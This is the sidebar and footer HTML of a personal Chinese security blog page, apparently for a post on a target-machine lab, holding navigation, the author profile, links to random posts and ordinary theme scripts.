href="/2024/05/10/InternalNet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="内网-域内信息收集">内网-域内信息收集</a></li><li class="active"><a href="/2024/06/29/InternalNet/ACK3/" rel="bookmark" title="红日靶机3">红日靶机3</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">113</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">18</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">62</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/JavaSE/" title="分类于 JavaSE">JavaSE</a></div><span><a href="/2023/07/24/JavaSE/javaSE%EF%BC%88%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%89/" title="JavaSE（面向对象）">JavaSE（面向对象）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaSE/" title="分类于 JavaSE">JavaSE</a></div><span><a href="/2023/07/28/JavaSE/JavaSE%EF%BC%88IO%E6%93%8D%E4%BD%9C%EF%BC%89/" title="JavaSE（IO操作）">JavaSE（IO操作）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Woodenhorse/" title="分类于 内存马">内存马</a></div><span><a href="/2023/11/02/Woodenhorse/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/" title="Servlet内存马">Servlet内存马</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/web/" title="分类于 Web">Web</a></div><span><a href="/2023/08/16/web/HTTP%E8%B5%B0%E7%A7%81/" title="Http走私">Http走私</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/04/01/java%E5%AE%89%E5%85%A8/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" title="RMI浅记">RMI浅记</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/07/17/ctfshow/%E5%85%B6%E4%BB%96php%E7%AF%87/" title="CTFshow-web入门其他">CTFshow-web入门其他</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/09/23/java%E5%AE%89%E5%85%A8/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">JNDI注入</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaJVM/" title="分类于 JavaJVM">JavaJVM</a></div><span><a href="/2023/09/10/JavaJVM/%E7%B1%BB%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="虐心短片之类文件结构">虐心短片之类文件结构</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/database/" title="分类于 数据库">数据库</a></div><span><a href="/2023/01/05/database/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/" title="数据库设计">数据库设计</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2023/08/15/Casualessay/Java%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/" title="Java网络化编程">Java网络化编程</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="timing"><span id="RunTime"></span><script>var BootDate = new Date("2022/9/23 23:00:00"); &#123;# 站点起始时间 #&#125;
    function ShowRunTime(id) {
      var NowDate = new Date();
      var RunDateM = parseInt(NowDate - BootDate);
      var RunDays = Math.floor(RunDateM/(24*3600*1000));
      var RunHours = Math.floor(RunDateM%(24*3600*1000)/(3600*1000));
      var RunMinutes = Math.floor(RunDateM%(24*3600*1000)%(3600*1000)/(60*1000));
      var RunSeconds = Math.round(RunDateM%(24*3600*1000)%(3600*1000)%(60*1000)/1000);
      var RunTime = RunDays + " &#123;&#123; __('footer.days') &#125;&#125; " + RunHours + " &#123;&#123; __('footer.hours') &#125;&#125; " + RunMinutes + " &#123;&#123; __('footer.minutes') &#125;&#125; " + RunSeconds + " &#123;&#123; __('footer.seconds') &#125;&#125;";
      document.getElementById(id).innerHTML = "&#123;&#123; __('footer.timing') &#125;&#125; " + RunTime;
    }
    setInterval("ShowRunTime('RunTime')", 1000);</script></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">1.1m 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">45:13</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/06/29/InternalNet/ACK3/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->